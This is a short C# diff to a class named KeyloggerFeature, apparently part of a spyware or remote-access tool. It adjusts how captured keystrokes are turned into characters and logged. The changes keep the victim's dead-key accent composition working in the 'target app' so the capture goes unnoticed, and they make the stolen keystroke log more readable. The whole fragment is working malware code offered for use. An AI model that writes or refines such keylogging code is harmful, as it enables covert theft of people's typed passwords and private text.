@@ -205,12 +205,18 @@ internal static class KeyloggerFeature
         var ks = new byte[256];
         GetKeyboardState(ks);
         var charBuf = new StringBuilder(4);
-        int n = ToUnicode(vk, sc, ks, charBuf, 4, 0);
+        // Flag 4 = don't modify the dead-key state — avoids breaking ^+a→â composition in the target app
+        int n = ToUnicode(vk, sc, ks, charBuf, 4, 4);
 
         lock (_bufLock)
         {
             if (n > 0 && charBuf.Length > 0 && !char.IsControl(charBuf[0]))
                 _buf.Append(charBuf[0]);
+            else if (n < 0)
+            {
+                // Dead key pressed (^, ¨, ~, …) — log it as-is so the log is readable
+                if (charBuf.Length > 0) _buf.Append(charBuf[0]);
+            }
             else
             {
                 string? special = VkToLabel(vk);
